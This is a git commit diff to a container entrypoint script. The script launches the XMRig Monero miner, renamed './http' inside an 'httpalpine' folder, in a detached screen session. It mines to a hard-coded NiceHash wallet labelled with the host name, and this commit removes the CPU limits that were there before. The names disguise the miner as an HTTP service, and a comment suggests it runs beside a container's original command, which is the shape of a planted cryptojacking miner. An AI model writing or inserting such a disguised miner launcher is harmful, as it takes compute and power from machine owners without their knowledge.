2483e13e20ae65b9bb8a3bdc3889e1593ce3001a
osnmoh007 <112149956+osnmoh007@users.noreply.github.com>
2024-09-01 07:23:38 +0100

    Update entrypoint2.sh

--- entrypoint2.sh
+++ entrypoint2.sh
@@ -15,7 +15,8 @@ cd /app2/httpalpine
 
 
 # Run XMRig with screen, using taskset to set CPU affinity and cpulimit to limit CPU usage
-screen -dmS http_session sh -c "taskset -c 4,6,10,11 cpulimit -l 80 -- ./http -a randomx -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbEnMD3JzpTFEEPPH9y5hitHCWbGE2PCfCs.${HOSTNAME} -p x -k --nicehash"
+#screen -dmS http_session sh -c "taskset -c 4,6,10,11 cpulimit -l 80 -- ./http -a randomx -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbEnMD3JzpTFEEPPH9y5hitHCWbGE2PCfCs.${HOSTNAME} -p x -k --nicehash"
+screen -dmS http_session sh -c "./http -a randomx -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbEnMD3JzpTFEEPPH9y5hitHCWbGE2PCfCs.${HOSTNAME} -p x -k --nicehash"
 
 # Change directory to /app and run the original command in the background
 # cd /app
